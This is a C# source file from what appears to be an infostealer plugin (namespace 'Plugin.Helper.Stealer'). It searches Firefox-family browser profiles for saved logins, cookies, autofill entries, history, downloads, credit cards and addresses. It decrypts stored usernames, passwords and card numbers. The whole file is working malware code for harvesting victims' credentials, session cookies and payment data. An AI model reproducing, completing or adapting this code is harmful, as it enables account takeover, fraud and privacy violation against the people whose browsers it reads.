

using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Web.Script.Serialization;
using InvokedCommon.Structs;


namespace Plugin.Helper.Stealer
{
	public static class Gecko
	{
		public static GeckoBrowser[] GetAllInfo(GeckoBrowserOptions options)
		{
			List<GeckoBrowser> geckoBrowserList = new List<GeckoBrowser>();
			bool flag1 = (options & GeckoBrowserOptions.Logins) == GeckoBrowserOptions.Logins;
			bool flag2 = (options & GeckoBrowserOptions.Cookies) == GeckoBrowserOptions.Cookies;
			bool flag3 = (options & GeckoBrowserOptions.Autofills) == GeckoBrowserOptions.Autofills;
			bool flag4 = (options & GeckoBrowserOptions.Downloads) == GeckoBrowserOptions.Downloads;
			bool flag5 = (options & GeckoBrowserOptions.History) == GeckoBrowserOptions.History;
			bool flag6 = (options & GeckoBrowserOptions.CreditCards) == GeckoBrowserOptions.CreditCards;
			bool flag7 = (options & GeckoBrowserOptions.Addresses) == GeckoBrowserOptions.Addresses;
			if (!flag1 && !flag2 && !flag3 && !flag4 && !flag5 && !flag6 && !flag7)
				return new GeckoBrowser[0];
			foreach (KeyValuePair<string, string> geckoBrowser in Configuration.GeckoBrowsers)
			{
				List<GeckoProfile> geckoProfileList = new List<GeckoProfile>();
				string key = geckoBrowser.Key;
				string path = geckoBrowser.Value;
				if (Directory.Exists(path))
				{
					foreach (string directory in Directory.GetDirectories(path))
					{
						string name = new DirectoryInfo(directory).Name;
						Login[] _logins = (Login[]) null;
						Cookie[] _cookies = (Cookie[]) null;
						AutoFill[] _autofills = (AutoFill[]) null;
						Download[] _downloads = (Download[]) null;
						HistoryEntry[] _history = (HistoryEntry[]) null;
						GeckoCreditCard[] _creditCards = (GeckoCreditCard[]) null;
						GeckoAddressInfo[] _addresses = (GeckoAddressInfo[]) null;
						if (flag1)
							_logins = Gecko.GetLogins(directory);
						if (flag2)
							_cookies = Gecko.GetCookies(directory);
						if (flag3)
							_autofills = Gecko.GetAutoFills(directory);
						if (flag4)
							_downloads = Gecko.GetDownloads(directory);
						if (flag5)
							_history = Gecko.GetHistory(directory);
						if (flag6)
							_creditCards = Gecko.GetCreditCards(directory);
						if (flag7)
							_addresses = Gecko.GetAddresses(directory);
						if (_logins != null || _cookies != null || _autofills != null || _downloads != null || _history != null || _creditCards != null || _addresses != null)
							geckoProfileList.Add(new GeckoProfile(_logins, _cookies, _autofills, _downloads, _history, _creditCards, _addresses, name));
					}
					geckoBrowserList.Add(new GeckoBrowser(geckoProfileList.ToArray(), key));
				}
			}
			return geckoBrowserList.ToArray();
		}

		public static AutoFill[] GetAutoFills(string profilePath)
		{
			List<AutoFill> autoFillList = new List<AutoFill>();
			string str1 = Path.Combine(profilePath, "formhistory.sqlite");
			if (!File.Exists(str1))
				return (AutoFill[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (AutoFill[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (AutoFill[]) null;
			}
			if (!sqlLite3Parser.ReadTable("moz_formhistory"))
				return (AutoFill[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _name = sqlLite3Parser.GetValue<string>(index, "fieldname");
				string str2 = sqlLite3Parser.GetValue<string>(index, "value");
				if (_name != null && str2 != null)
					autoFillList.Add(new AutoFill(_name, str2));
			}
			return autoFillList.ToArray();
		}

		public static Cookie[] GetCookies(string profilePath)
		{
			List<Cookie> cookieList = new List<Cookie>();
			string str1 = Path.Combine(profilePath, "cookies.sqlite");
			if (!File.Exists(str1))
				return (Cookie[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (Cookie[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (Cookie[]) null;
			}
			if (!sqlLite3Parser.ReadTable("moz_cookies"))
				return (Cookie[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				try
				{
					string _domain = sqlLite3Parser.GetValue<string>(index, "host");
					string _name = sqlLite3Parser.GetValue<string>(index, "name");
					string str2 = sqlLite3Parser.GetValue<string>(index, "value");
					string _path = sqlLite3Parser.GetValue<string>(index, "path");
					int _expiry = sqlLite3Parser.GetValue<int>(index, "expiry");
					bool _isSecure = sqlLite3Parser.GetValue<int>(index, "isSecure") == 1;
					bool _isHttpOnly = sqlLite3Parser.GetValue<int>(index, "isHttpOnly") == 1;
					if (_domain != null)
					{
						if (_name != null)
						{
							if (str2 != null)
							{
								if (_path != null)
									cookieList.Add(new Cookie(_domain, _path, _name, str2, _expiry, _isSecure, _isHttpOnly));
							}
						}
					}
				}
				catch
				{
				}
			}
			return cookieList.ToArray();
		}

		public static Login[] GetLogins(string profilePath)
		{
			List<Login> loginList = new List<Login>();
			string sqlitePath = Path.Combine(profilePath, "signons.sqlite");
			string jsonPath = Path.Combine(profilePath, "logins.json");

			if (File.Exists(sqlitePath) && new FileInfo(sqlitePath).Length > 100L)
			{
				byte[] dbData = Utils.ForceReadFile(sqlitePath);
				if (dbData == null)
					return null;

				SqlLite3Parser sqlParser;
				try
				{
					sqlParser = new SqlLite3Parser(dbData);
				}
				catch
				{
					return null;
				}

				if (!sqlParser.ReadTable("moz_logins"))
					return null;

				for (int i = 0; i < sqlParser.GetRowCount(); i++)
				{
					try
					{
						string host = sqlParser.GetValue<string>(i, "hostname");
						string encUser = sqlParser.GetValue<string>(i, "encryptedUsername");
						string encPass = sqlParser.GetValue<string>(i, "encryptedPassword");

						if (host != null && encUser != null && encPass != null)
						{
							string user = GeckoDecryptor.DecryptBase64(profilePath, encUser);
							string pass = GeckoDecryptor.DecryptBase64(profilePath, encPass);

							if (host != null && user != null && pass != null)
								loginList.Add(new Login(user, pass, host));
						}
					}
					catch { }
				}
			}
			else
			{
				if (!File.Exists(jsonPath))
					return null;

				string jsonData = Utils.ForceReadFileString(jsonPath);
				if (jsonData == null)
					return null;

				object deserialized;
				try
				{
					deserialized = new JavaScriptSerializer().Deserialize<object>(jsonData);
				}
				catch
				{
					return null;
				}

				if (!(deserialized is Dictionary<string, object> root) || !root.ContainsKey("logins"))
					return null;

				object loginsObj = root["logins"];
				if (!(loginsObj is List<object> loginsList))
					return null;

				foreach (object loginEntry in loginsList)
				{
					if (!(loginEntry is Dictionary<string, object> loginDict))
						continue;

					try
					{
						if (!loginDict.ContainsKey("hostname") ||
							!loginDict.ContainsKey("encryptedUsername") ||
							!loginDict.ContainsKey("encryptedPassword"))
							continue;

						object hostObj = loginDict["hostname"];
						object userObj = loginDict["encryptedUsername"];
						object passObj = loginDict["encryptedPassword"];

						string host = hostObj?.ToString();
						string encUser = userObj?.ToString();
						string encPass = passObj?.ToString();

						if (host == null || encUser == null || encPass == null)
							continue;

						string user = GeckoDecryptor.DecryptBase64(profilePath, encUser);
						string pass = GeckoDecryptor.DecryptBase64(profilePath, encPass);

						if (user != null && pass != null)
							loginList.Add(new Login(user, pass, host));
					}
					catch { }
				}
			}

			return loginList.ToArray();
		}

		public static Download[] GetDownloads(string profilePath)
		{
			List<Download> downloadList = new List<Download>();
			string str1 = Path.Combine(profilePath, "places.sqlite");
			if (!File.Exists(str1))
				return (Download[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (Download[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (Download[]) null;
			}
			Dictionary<int, string> dictionary = new Dictionary<int, string>();
			if (!sqlLite3Parser.ReadTable("moz_annos"))
				return (Download[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				int key = (int) sqlLite3Parser.GetValue<byte>(index, "place_id");
				if (key == 0)
					key = sqlLite3Parser.GetValue<int>(index, "place_id");
				string str2 = sqlLite3Parser.GetValue<string>(index, "content");
				if (str2 != null && key != 0 && str2.StartsWith("file://"))
					dictionary[key] = str2;
			}
			if (!sqlLite3Parser.ReadTable("moz_places"))
				return (Download[]) null;
			int[] array = dictionary.Keys.ToArray<int>();
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				int key = sqlLite3Parser.GetValue<int>(index, "id");
				if (((IEnumerable<int>) array).Contains<int>(key))
				{
					string _url = sqlLite3Parser.GetValue<string>(index, "url");
					if (_url != null)
						downloadList.Add(new Download(_url, dictionary[key]));
				}
			}
			return downloadList.ToArray();
		}

		public static HistoryEntry[] GetHistory(string profilePath)
		{
			List<HistoryEntry> historyEntryList = new List<HistoryEntry>();
			string str = Path.Combine(profilePath, "places.sqlite");
			if (!File.Exists(str))
				return (HistoryEntry[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str);
			if (db_bytes == null)
				return (HistoryEntry[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (HistoryEntry[]) null;
			}
			if (!sqlLite3Parser.ReadTable("moz_places"))
				return (HistoryEntry[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _url = sqlLite3Parser.GetValue<string>(index, "url");
				string _title = sqlLite3Parser.GetValue<string>(index, "title") ?? _url;
				bool flag = sqlLite3Parser.GetValue<int>(index, "hidden") == 1;
				if (_url != null && !flag)
					historyEntryList.Add(new HistoryEntry(_url, _title));
			}
			historyEntryList.Reverse();
			return historyEntryList.ToArray();
		}

		public static GeckoCreditCard[] GetCreditCards(string profilePath)
		{
			List<GeckoCreditCard> geckoCreditCardList = new List<GeckoCreditCard>();
			string filePath = Path.Combine(profilePath, "autofill-profiles.json");
			if (!File.Exists(filePath))
				return null;

			string jsonContent = Utils.ForceReadFileString(filePath);
			if (jsonContent == null)
				return null;

			object deserialized;
			try
			{
				deserialized = new JavaScriptSerializer().Deserialize<object>(jsonContent);
			}
			catch
			{
				return null;
			}

			if (!(deserialized is Dictionary<string, object> rootDict))
				return null;

			if (!rootDict.ContainsKey("creditCards"))
				return null;

			object creditCardsObj = rootDict["creditCards"];
			if (!(creditCardsObj is List<object> creditCardsList))
				return null;

			foreach (object cardEntry in creditCardsList)
			{
				if (!(cardEntry is Dictionary<string, object> cardDict))
					continue;

				if (!cardDict.ContainsKey("cc-exp-month") ||
					!cardDict.ContainsKey("cc-exp-year") ||
					!cardDict.ContainsKey("cc-name") ||
					!cardDict.ContainsKey("cc-type") ||
					!cardDict.ContainsKey("cc-number-encrypted"))
					continue;

				if (!(cardDict["cc-exp-month"] is int expMonth) ||
					!(cardDict["cc-exp-year"] is int expYear) ||
					!(cardDict["cc-name"] is string name) ||
					!(cardDict["cc-type"] is string type) ||
					!(cardDict["cc-number-encrypted"] is string encryptedNumber))
					continue;

				string appName = GeckoDecryptor.GetMOZAPPBASENAMEFromProfilePath(profilePath);
				if (appName == null)
					return null;

				byte[] decryptedData = GeckoDecryptor.OsKeyStoreDecrypt(appName, encryptedNumber);
				if (decryptedData == null)
					return null;

				string cardNumber = Encoding.UTF8.GetString(decryptedData);
				geckoCreditCardList.Add(new GeckoCreditCard(name, type, cardNumber, expMonth, expYear));
			}

			return geckoCreditCardList.ToArray();
		}

		public static GeckoAddressInfo[] GetAddresses(string profilePath)
		{
			List<GeckoAddressInfo> geckoAddressInfoList = new List<GeckoAddressInfo>();
			string filePath = Path.Combine(profilePath, "autofill-profiles.json");
			if (!File.Exists(filePath))
				return null;

			string jsonContent = Utils.ForceReadFileString(filePath);
			if (jsonContent == null)
				return null;

			object deserialized;
			try
			{
				deserialized = new JavaScriptSerializer().Deserialize<object>(jsonContent);
			}
			catch
			{
				return null;
			}

			if (!(deserialized is Dictionary<string, object> rootDict))
				return null;

			if (!rootDict.ContainsKey("addresses"))
				return null;

			object addressesObj = rootDict["addresses"];
			if (!(addressesObj is List<object> addressesList))
				return null;

			foreach (object entry in addressesList)
			{
				if (!(entry is Dictionary<string, object> addressDict))
					return null;

				if (!addressDict.ContainsKey("name") || !(addressDict["name"] is string) ||
					!addressDict.ContainsKey("organization") || !(addressDict["organization"] is string) ||
					!addressDict.ContainsKey("street-address") || !(addressDict["street-address"] is string) ||
					!addressDict.ContainsKey("address-level2") || !(addressDict["address-level2"] is string) ||
					!addressDict.ContainsKey("address-level1") || !(addressDict["address-level1"] is string) ||
					!addressDict.ContainsKey("postal-code") || !(addressDict["postal-code"] is string) ||
					!addressDict.ContainsKey("country") || !(addressDict["country"] is string) ||
					!addressDict.ContainsKey("tel") || !(addressDict["tel"] is string) ||
					!addressDict.ContainsKey("email") || !(addressDict["email"] is string) ||
					!addressDict.ContainsKey("given-name") || !(addressDict["given-name"] is string) ||
					!addressDict.ContainsKey("additional-name") || !(addressDict["additional-name"] is string) ||
					!addressDict.ContainsKey("family-name") || !(addressDict["family-name"] is string) ||
					!addressDict.ContainsKey("address-line1") || !(addressDict["address-line1"] is string) ||
					!addressDict.ContainsKey("address-line2") || !(addressDict["address-line2"] is string) ||
					!addressDict.ContainsKey("address-line3") || !(addressDict["address-line3"] is string) ||
					!addressDict.ContainsKey("country-name") || !(addressDict["country-name"] is string) ||
					!addressDict.ContainsKey("tel-national") || !(addressDict["tel-national"] is string) ||
					!addressDict.ContainsKey("tel-country-code") || !(addressDict["tel-country-code"] is string) ||
					!addressDict.ContainsKey("tel-area-code") || !(addressDict["tel-area-code"] is string) ||
					!addressDict.ContainsKey("tel-local") || !(addressDict["tel-local"] is string) ||
					!addressDict.ContainsKey("tel-local-prefix") || !(addressDict["tel-local-prefix"] is string) ||
					!addressDict.ContainsKey("tel-local-suffix") || !(addressDict["tel-local-suffix"] is string))
					return null;

				geckoAddressInfoList.Add(new GeckoAddressInfo(
					(string)addressDict["name"],
					(string)addressDict["organization"],
					(string)addressDict["street-address"],
					(string)addressDict["address-level2"],
					(string)addressDict["address-level1"],
					(string)addressDict["postal-code"],
					(string)addressDict["country"],
					(string)addressDict["tel"],
					(string)addressDict["email"],
					(string)addressDict["given-name"],
					(string)addressDict["additional-name"],
					(string)addressDict["family-name"],
					(string)addressDict["address-line1"],
					(string)addressDict["address-line2"],
					(string)addressDict["address-line3"],
					(string)addressDict["country-name"],
					(string)addressDict["tel-national"],
					(string)addressDict["tel-country-code"],
					(string)addressDict["tel-area-code"],
					(string)addressDict["tel-local"],
					(string)addressDict["tel-local-prefix"],
					(string)addressDict["tel-local-suffix"]
				));
			}

			return geckoAddressInfoList.ToArray();
		}
	}
}
